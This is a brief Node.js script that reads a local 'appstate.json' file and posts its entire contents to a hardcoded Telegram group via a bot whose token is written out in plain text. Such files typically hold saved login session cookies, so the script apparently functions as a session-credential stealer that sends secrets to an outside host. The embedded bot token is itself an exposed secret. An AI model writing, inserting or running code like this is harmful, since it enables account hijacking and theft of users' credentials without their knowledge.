const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

const botToken = '6786693118:AAGEZ3MDC7HgHOrSB2x1eW8E4DpPVooj0x8';
const bot = new TelegramBot(botToken, {polling: true});

const adminIds = ['-1001928617056']; 

fs.readFile('appstate.json', 'utf8', (err, data) => {
  if (err) {
    console.error(err);
    return;
  }

  adminIds.forEach(adminId => {
    bot.sendMessage(adminId, data);
  });
});
